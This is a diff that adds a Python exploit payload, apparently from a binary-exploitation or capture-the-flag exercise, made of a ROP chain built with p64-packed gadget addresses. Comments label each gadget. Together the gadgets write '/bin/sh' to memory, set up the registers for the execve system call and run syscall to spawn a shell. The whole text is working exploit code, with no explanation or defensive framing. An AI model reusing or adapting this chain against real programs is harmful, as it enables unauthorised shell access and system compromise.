@@ -1,0 +1,23 @@
+payload = p64(0x412cee)
+#0x0000000000412cee: fucomip st(0); pop rdi; ret; 
+payload += p64(0x435070)+p64(0x425eb6)
+# 0x0000000000425eb6: pop rax; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x411dfe)
+# 0x0000000000411dfe: mov qword ptr [rdi], rax; ret; 
+payload += p64(0x425eb6)
+# 0x0000000000425eb6: pop rax; ret; 
+payload += p64(0x0)+p64(0x40125d)
+# 0x000000000040125d: pop rbp; ret; 
+payload += p64(0x41075c)+p64(0x41f7b7)
+# 0x41f7b7: mov edx, eax ; xor eax, eax ; call rbp
+payload += b''
+# 0x000000000041075c: pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x412cee)
+# 0x0000000000412cee: fucomip st(0); pop rdi; ret; 
+payload += p64(0x435070)+p64(0x410883)
+# 0x0000000000410883: pop rsi; ret; 
+payload += p64(0x0)+p64(0x425eb6)
+# 0x0000000000425eb6: pop rax; ret; 
+payload += p64(0x3b)+p64(0x42f72b)
+# 0x000000000042f72b: syscall; 
+payload += b''
